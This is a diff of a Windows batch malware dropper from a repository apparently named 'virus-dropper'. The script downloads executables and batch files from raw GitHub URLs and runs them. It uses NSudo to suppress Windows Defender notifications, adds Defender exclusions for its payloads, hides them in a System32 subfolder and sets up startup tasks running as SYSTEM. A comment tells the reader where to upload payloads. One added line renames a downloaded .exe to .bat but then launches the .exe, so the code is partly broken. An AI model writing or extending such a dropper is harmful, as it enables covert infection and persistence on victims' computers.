@@ -8,10 +8,13 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows3.exe" --output "%appdata%\Windows3.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 ::windows defender exclusions
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows3.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"winmanager.exe'"
 md "%systemroot%\System32\Windowsexe"
 
 ::upload files here: github.com - create account and create repository (public) then upload files
@@ -21,14 +24,22 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Wi
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+
+::update file here
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
 move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
+::do not change the --output
+
+
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Winmanager'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
+move "%appdata%\Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.bat"
 copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
+start "Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL LIMITED
